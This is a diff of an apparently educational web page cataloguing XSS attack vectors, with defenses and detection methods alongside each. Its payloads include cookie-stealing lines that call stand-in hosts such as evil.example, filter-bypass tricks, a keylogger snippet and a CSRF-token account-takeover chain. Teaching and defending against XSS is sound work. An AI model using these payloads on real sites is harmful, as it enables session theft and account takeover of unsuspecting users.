@@ -217,42 +217,245 @@
         <div class="content">
             <h1>XSS Attack Vectors</h1>
 
-<h2>Reflected XSS</h2>
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#core-flow">The Core Attack Flow</a></li>
+<li><a href="#v1-html-body">1. HTML-Body Injection</a></li>
+<li><a href="#v2-attribute">2. HTML-Attribute Breakout</a></li>
+<li><a href="#v3-js-context">3. JavaScript-Context Injection</a></li>
+<li><a href="#v4-url">4. URL / <code>javascript:</code> Scheme</a></li>
+<li><a href="#v5-css">5. CSS-Context Injection</a></li>
+<li><a href="#v6-event-handlers">6. Event-Handler &amp; Tagless Payloads</a></li>
+<li><a href="#v7-dom-sinks">7. Dangerous DOM Sinks</a></li>
+<li><a href="#v8-stored">8. Stored XSS via User-Generated Content</a></li>
+<li><a href="#v9-json">9. Reflected JSON &amp; Content-Type Confusion</a></li>
+<li><a href="#v10-mxss">10. Mutation XSS (mXSS)</a></li>
+<li><a href="#v11-bypasses">11. Filter &amp; Sanitizer Bypasses</a></li>
+<li><a href="#v12-payloads">12. What the Payload Does Next</a></li>
+<li><a href="#detection">Detection Techniques</a></li>
+</ul>
+</div>
 
-<p>``<code>html</p>
-<!-- URL: /search?q=<script>alert('XSS')</script> -->
-<div>Results: <script>alert('XSS')</script></div>
-</code>`<code>
+<h2 id="core-flow">The Core Attack Flow</h2>
 
-<h2>Stored XSS</h2>
+<p>Every XSS attack, regardless of type, follows the same shape: an attacker finds a <strong>source</strong> of untrusted data they control, confirms it reaches a <strong>sink</strong> that interprets data as code, and crafts a payload that survives the trip and breaks out of the surrounding context.</p>
 
-</code>`<code>javascript
-<p>// Attacker posts comment</p>
-<p>POST /api/comments</p>
-<p>{</p>
-<p>  "text": "<script>fetch('//evil.com?c='+document.cookie)</script>"</p>
-<p>}</p>
+<pre><code>SOURCE (attacker-controlled)        SINK (interprets as code)
+  URL query / fragment                HTML written to response
+  Form field / POST body              innerHTML / outerHTML
+  Stored record (comment, name)       document.write()
+  document.referrer                   eval() / new Function()
+  postMessage / WebSocket data        setTimeout("string")
+  HTTP header echoed into page        location / location.href
 
-<p>// Stored in database, executed for all viewers</p>
-</code>`<code>
+Attacker's job: connect a source to a sink, then break out of the
+surrounding context (tag, attribute, string, URL) into script.</code></pre>
 
-<h2>DOM-based XSS</h2>
+<p>The rest of this page enumerates the concrete contexts and sinks. For each, the key question is: <em>what character or sequence lets attacker data escape "data" and become "code"?</em></p>
 
-</code>`<code>javascript
-<p>// Vulnerable JavaScript</p>
-<p>document.getElementById('welcome').innerHTML = </p>
-<p>    "Hello " + location.hash.substring(1);</p>
+<h2 id="v1-html-body">1. HTML-Body Injection</h2>
 
-<p>// Attack URL: site.com#<img src=x onerror=alert('XSS')></p>
-</code>`<code>
+<p>The simplest context: untrusted data written directly between tags. Any <code>&lt;</code> starts a new tag, so the attacker introduces their own element.</p>
 
-<h2>Event Handler XSS</h2>
+<pre><code>Sink:     &lt;div&gt;Hello, USERNAME&lt;/div&gt;
+Payload:  &lt;script&gt;steal(document.cookie)&lt;/script&gt;
+Result:   &lt;div&gt;Hello, &lt;script&gt;steal(document.cookie)&lt;/script&gt;&lt;/div&gt;
 
-</code>`<code>html
-<img src="x" onerror="alert('XSS')">
-<body onload="alert('XSS')">
-<svg onload="alert('XSS')">
-</code>``
+Tagless variant (survives naive &lt;script&gt; blacklists):
+  &lt;img src=x onerror=steal(document.cookie)&gt;
+  &lt;svg onload=steal(document.cookie)&gt;
+  &lt;iframe src="javascript:steal(document.cookie)"&gt;&lt;/iframe&gt;</code></pre>
+
+<p><strong>Required encoding</strong>: convert <code>&lt; &gt; &amp;</code> to <code>&amp;lt; &amp;gt; &amp;amp;</code> so the browser renders them as text rather than markup.</p>
+
+<h2 id="v2-attribute">2. HTML-Attribute Breakout</h2>
+
+<p>When data lands inside a quoted attribute, the attacker's first goal is to close the quote and the tag, or to inject a new event-handler attribute. Unquoted attributes are far worse&mdash;a single space starts a new attribute.</p>
+
+<pre><code>Sink (quoted):    &lt;input type="text" value="DATA"&gt;
+Payload:          "&gt;&lt;script&gt;steal()&lt;/script&gt;
+Result:           &lt;input type="text" value=""&gt;&lt;script&gt;steal()&lt;/script&gt;"&gt;
+
+Sink (unquoted):  &lt;input value=DATA&gt;
+Payload:          x onmouseover=steal()
+Result:           &lt;input value=x onmouseover=steal()&gt;   (no quote break needed)</code></pre>
+
+<p><strong>Required encoding</strong>: HTML-attribute encoding (encode quotes <code>&amp;quot; &amp;#39;</code> and angle brackets), and <em>always quote attributes</em>. Never place untrusted data in an attribute name or in an event-handler attribute.</p>
+
+<h2 id="v3-js-context">3. JavaScript-Context Injection</h2>
+
+<p>Data written inside an inline <code>&lt;script&gt;</code> block or an event handler is already in an executable context. Even inside a quoted string, a quote, backslash, or newline breaks out&mdash;and <code>&lt;/script&gt;</code> can terminate the whole block regardless of JS string rules, because the HTML parser sees it first.</p>
+
+<pre><code>Sink:     &lt;script&gt; var name = "DATA"; &lt;/script&gt;
+Payload:  "; steal(); //
+Result:   &lt;script&gt; var name = ""; steal(); //"; &lt;/script&gt;
+
+Parser-level breakout (works even inside a JS string):
+Payload:  &lt;/script&gt;&lt;script&gt;steal()&lt;/script&gt;</code></pre>
+
+<p><strong>Required encoding</strong>: JavaScript string encoding (hex-escape quotes, backslash, and line terminators) <em>and</em> block <code>&lt;/</code> sequences. Better: do not inject server data into script blocks at all&mdash;pass it via a JSON <code>&lt;script type="application/json"&gt;</code> block or a <code>data-</code> attribute and read it with <code>JSON.parse</code>/<code>textContent</code>.</p>
+
+<h2 id="v4-url">4. URL / <code>javascript:</code> Scheme</h2>
+
+<p>When untrusted data becomes a URL in an <code>href</code>, <code>src</code>, <code>action</code>, or a redirect, an attacker can supply the <code>javascript:</code> (or <code>data:</code>) scheme, which executes when the link is followed.</p>
+
+<pre><code>Sink:     &lt;a href="DATA"&gt;profile&lt;/a&gt;
+Payload:  javascript:steal(document.cookie)
+Result:   &lt;a href="javascript:steal(document.cookie)"&gt;profile&lt;/a&gt;
+
+Also dangerous:
+  &lt;a href="data:text/html,&lt;script&gt;steal()&lt;/script&gt;"&gt;
+  window.location = untrustedValue   // DOM redirect to javascript: URL</code></pre>
+
+<p><strong>Required defense</strong>: URL-encode query components, and <em>validate the scheme</em>&mdash;allow only <code>http:</code>, <code>https:</code>, <code>mailto:</code> (an allow-list), rejecting <code>javascript:</code>, <code>data:</code>, and <code>vbscript:</code>.</p>
+
+<h2 id="v5-css">5. CSS-Context Injection</h2>
+
+<p>Untrusted data in a <code>style</code> attribute or <code>&lt;style&gt;</code> block can, in legacy engines, execute (<code>expression()</code>), and in all engines can exfiltrate data or load attacker resources via <code>url()</code>, or perform UI-redress attacks.</p>
+
+<pre><code>Sink:     &lt;div style="color: DATA"&gt;
+Payload:  red; background:url('//evil.example/leak?x=' + ...)
+
+Legacy IE (historical): width: expression(steal())
+Modern abuse: exfiltrate attribute values via CSS selectors + url()</code></pre>
+
+<p><strong>Required defense</strong>: do not place untrusted data in CSS. If unavoidable, allow-list a strict set of properties/values and CSS-encode; never allow raw <code>url()</code> or <code>expression()</code>.</p>
+
+<h2 id="v6-event-handlers">6. Event-Handler &amp; Tagless Payloads</h2>
+
+<p>Because so many filters look specifically for <code>&lt;script&gt;</code>, most real-world payloads avoid it entirely and rely on HTML event-handler attributes that fire automatically.</p>
+
+<pre><code>&lt;img src=x onerror=steal()&gt;              fires when the image 404s
+&lt;svg onload=steal()&gt;                     fires on SVG load
+&lt;body onload=steal()&gt;                    fires on page load
+&lt;video&gt;&lt;source onerror=steal()&gt;          media error handler
+&lt;input autofocus onfocus=steal()&gt;        fires when focused
+&lt;details open ontoggle=steal()&gt;          fires on toggle
+&lt;marquee onstart=steal()&gt;                fires on start</code></pre>
+
+<p><strong>Lesson for defenders</strong>: there is no finite blacklist of dangerous tags or attributes. Only context-aware <em>encoding</em> (turning markup into text) or an allow-list <em>sanitizer</em> reliably prevents these.</p>
+
+<h2 id="v7-dom-sinks">7. Dangerous DOM Sinks</h2>
+
+<p>DOM-based XSS happens entirely in the browser when client JavaScript feeds attacker-controlled data into an API that parses HTML or evaluates code. These sinks are the client-side equivalent of unescaped output.</p>
+
+<table>
+<thead>
+<tr><th>Sink</th><th>Why it is dangerous</th><th>Safe alternative</th></tr>
+</thead>
+<tbody>
+<tr><td><code>element.innerHTML</code> / <code>outerHTML</code></td><td>Parses the string as HTML</td><td><code>textContent</code>, or sanitize first</td></tr>
+<tr><td><code>insertAdjacentHTML()</code></td><td>Parses HTML at a position</td><td>Build nodes with <code>createElement</code></td></tr>
+<tr><td><code>document.write()</code></td><td>Writes raw HTML into the stream</td><td>DOM APIs / <code>textContent</code></td></tr>
+<tr><td><code>eval()</code> / <code>new Function()</code></td><td>Executes the string as code</td><td>Never with untrusted data; <code>JSON.parse</code></td></tr>
+<tr><td><code>setTimeout("str")</code> / <code>setInterval("str")</code></td><td>String form is an implicit <code>eval</code></td><td>Pass a function reference, not a string</td></tr>
+<tr><td><code>location</code> / <code>location.href</code> / <code>.assign()</code></td><td>Navigates to <code>javascript:</code> URLs</td><td>Validate scheme before assigning</td></tr>
+<tr><td>jQuery <code>.html()</code>, <code>$(...)</code> with markup</td><td>Wraps <code>innerHTML</code></td><td><code>.text()</code>, or sanitize</td></tr>
+</tbody>
+</table>
+
+<pre><code>// Classic DOM XSS: source (location.hash) -&gt; sink (innerHTML)
+box.innerHTML = "Welcome " + decodeURIComponent(location.hash.slice(1));
+
+// Attack: https://site.example/#&lt;img src=x onerror=steal()&gt;</code></pre>
+
+<h2 id="v8-stored">8. Stored XSS via User-Generated Content</h2>
+
+<p>Any field that is saved and later shown to other users is a stored-XSS surface: comments, reviews, profile names and bios, forum posts, chat messages, filenames, support tickets, even log entries rendered in an admin console.</p>
+
+<pre><code>1. Attacker submits a review:
+   POST /products/42/reviews
+   body=Great product&lt;script&gt;
+        new Image().src='//evil.example/c?'+document.cookie&lt;/script&gt;
+
+2. Server stores the body verbatim.
+
+3. Every future visitor to /products/42 receives:
+   &lt;li class="review"&gt;Great product&lt;script&gt; ... &lt;/script&gt;&lt;/li&gt;
+   -&gt; the script runs in each visitor's session.</code></pre>
+
+<p>Stored XSS is uniquely dangerous because it needs no per-victim phishing, reaches privileged viewers (moderators/admins), and can be built into a <strong>self-propagating worm</strong> when the injected script itself posts new infected content.</p>
+
+<h2 id="v9-json">9. Reflected JSON &amp; Content-Type Confusion</h2>
+
+<p>An endpoint that echoes input into a response served (or sniffed) as HTML can be exploited even if it was "meant" to be JSON.</p>
+
+<pre><code>Endpoint returns:  {"q": "USERINPUT"}   with Content-Type: text/html
+                   (or no Content-Type, letting the browser sniff)
+Attack:            ?q=&lt;script&gt;steal()&lt;/script&gt;
+Browser renders the "JSON" as HTML and runs the script.</code></pre>
+
+<p><strong>Defense</strong>: always send <code>Content-Type: application/json</code> and <code>X-Content-Type-Options: nosniff</code>; never build HTML responses by string-concatenating request values.</p>
+
+<h2 id="v10-mxss">10. Mutation XSS (mXSS)</h2>
+
+<p>Mutation XSS exploits the gap between what a sanitizer <em>sees</em> and what the browser <em>produces</em> after re-parsing. Markup that looks safe as a string can "mutate" into script when the browser normalizes the DOM (for example, inside <code>&lt;template&gt;</code>, <code>&lt;svg&gt;</code>/<code>&lt;math&gt;</code> foreign-content contexts, or when malformed HTML is fixed up).</p>
+
+<pre><code>Input the sanitizer approves (looks inert):
+   &lt;svg&gt;&lt;style&gt;&lt;img src=x onerror=steal()&gt;
+After the browser re-parses/normalizes the DOM, the payload
+re-emerges in an executable position -&gt; script runs.</code></pre>
+
+<p><strong>Defense</strong>: use a battle-tested sanitizer (DOMPurify) that is explicitly hardened against known mXSS mutations, and re-sanitize after any transformation. Do not roll your own HTML sanitizer.</p>
+
+<h2 id="v11-bypasses">11. Filter &amp; Sanitizer Bypasses</h2>
+
+<p>Attackers assume a filter exists and probe its edges. Common bypass techniques against weak, blacklist-style filters:</p>
+
+<ul>
+<li><strong>Case &amp; whitespace</strong>: <code>&lt;ScRiPt&gt;</code>, <code>&lt;img/src=x/onerror=...&gt;</code>, tabs/newlines inside tags.</li>
+<li><strong>Encoding layers</strong>: HTML entities (<code>&amp;#106;</code> for <code>j</code>), URL-encoding, and double-encoding to slip past a single decode pass.</li>
+<li><strong>Broken tags the parser repairs</strong>: <code>&lt;img src=x onerror=... &lt;</code> or unclosed tags that the browser auto-closes into an executable shape.</li>
+<li><strong>Tagless vectors</strong>: <code>javascript:</code> URLs, <code>on*</code> handlers, CSS, when only <code>&lt;script&gt;</code> is filtered.</li>
+<li><strong>Nested/partial removal</strong>: <code>&lt;scr&lt;script&gt;ipt&gt;</code> where a filter that strips one <code>&lt;script&gt;</code> leaves a valid one behind.</li>
+<li><strong>Namespace confusion</strong>: SVG/MathML foreign content where parsing rules differ from HTML.</li>
+</ul>
+
+<p><strong>Lesson</strong>: every bypass here defeats <em>blacklists and regex filters</em>. None of them defeat correct, context-aware <em>output encoding</em> or an allow-list DOM sanitizer&mdash;which is exactly why those are the recommended defenses.</p>
+
+<h2 id="v12-payloads">12. What the Payload Does Next</h2>
+
+<p>Landing script is only the beginning. Once code runs as the origin, common post-exploitation goals include:</p>
+
+<ul>
+<li><strong>Session/token theft</strong>: <code>new Image().src='//evil/c?'+document.cookie</code>, or read a token from <code>localStorage</code> and exfiltrate it.</li>
+<li><strong>CSRF-token theft &amp; request forgery</strong>: read the anti-CSRF token from the DOM, then <code>fetch()</code> a state-changing endpoint (change email, add admin) with the victim's session.</li>
+<li><strong>Keylogging</strong>: <code>document.addEventListener('keydown', e =&gt; exfil(e.key))</code> to capture passwords typed on the page.</li>
+<li><strong>Account takeover</strong>: silently submit the "change email / change password" form, then trigger a password reset.</li>
+<li><strong>Worm propagation</strong>: post the payload itself as new content so every viewer re-infects, achieving exponential spread (the MySpace "Samy" pattern).</li>
+<li><strong>Phishing / UI redress</strong>: overlay a fake login modal, or rewrite links to route users to attacker pages.</li>
+</ul>
+
+<pre><code>// Illustrative account-takeover chain (runs as the victim's origin)
+fetch('/account/settings')                       // 1. read CSRF token
+  .then(r =&gt; r.text())
+  .then(html =&gt; {
+    const token = html.match(/csrf" value="([^"]+)/)[1];
+    return fetch('/account/email', {             // 2. forge the request
+      method: 'POST',
+      headers: {'Content-Type':'application/x-www-form-urlencoded'},
+      body: 'csrf=' + token + '&amp;email=attacker@evil.example'
+    });
+  });                                             // 3. attacker now owns recovery</code></pre>
+
+<h2 id="detection">Detection Techniques</h2>
+
+<ul>
+<li><strong>Reflected/stored</strong>: fuzz every parameter, header, and stored field with a unique marker (e.g., <code>xss7331</code>), then search responses for it appearing <em>unencoded</em> in an HTML/JS/attribute context. Automated scanners (OWASP ZAP, Burp) cover much of this.</li>
+<li><strong>DOM-based</strong>: use browser DevTools and DOM-XSS-aware tools to trace data flow from sources (<code>location</code>, <code>document.referrer</code>, <code>postMessage</code>) to sinks (<code>innerHTML</code>, <code>eval</code>). Static taint analysis and linters help.</li>
+<li><strong>Code review</strong>: grep for sinks (<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>dangerouslySetInnerHTML</code>, <code>|safe</code>, <code>mark_safe</code>) and audit each for untrusted input.</li>
+<li><strong>CSP as a tripwire</strong>: a report-only CSP surfaces inline-script execution attempts in production, flagging live XSS.</li>
+</ul>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention</a></strong>: Turn these vectors off with layered, context-aware defenses</li>
+<li><strong><a href="examples.html">Examples</a></strong>: See each vector as vulnerable vs. secure code</li>
+<li><strong><a href="overview.html">Overview</a></strong>: The three types, impact, and misconceptions</li>
+<li><strong><a href="./lab/cross-site-scripting/">Hands-On Lab</a></strong>: Practice identifying and fixing these vectors safely</li>
+</ul>
 
         </div>
     </div>
